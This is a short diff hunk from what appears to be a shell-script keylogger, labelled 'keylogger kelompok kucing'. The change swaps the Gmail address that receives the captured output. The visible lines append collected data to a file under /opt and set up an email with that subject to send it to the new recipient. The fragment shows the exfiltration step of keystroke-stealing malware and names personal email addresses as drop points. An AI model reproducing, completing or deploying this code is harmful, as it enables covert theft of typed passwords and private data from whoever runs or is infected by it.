@@ -166,7 +166,7 @@ echo $cc >> /opt/kelompokkucing/output.txt
 # cat $/opt/kelompokkucing/OUTPUT.txt 
 
 #####################kirim email
-RECIEVER="luckyrama0@gmail.com"
+RECIEVER="majorminor658@gmail.com"
 SUBJECT="Subject: keylogger kelompok kucing"
 MAIL="/opt/$FOLDER/mail.txt"
 echo $SUBJECT > $MAIL
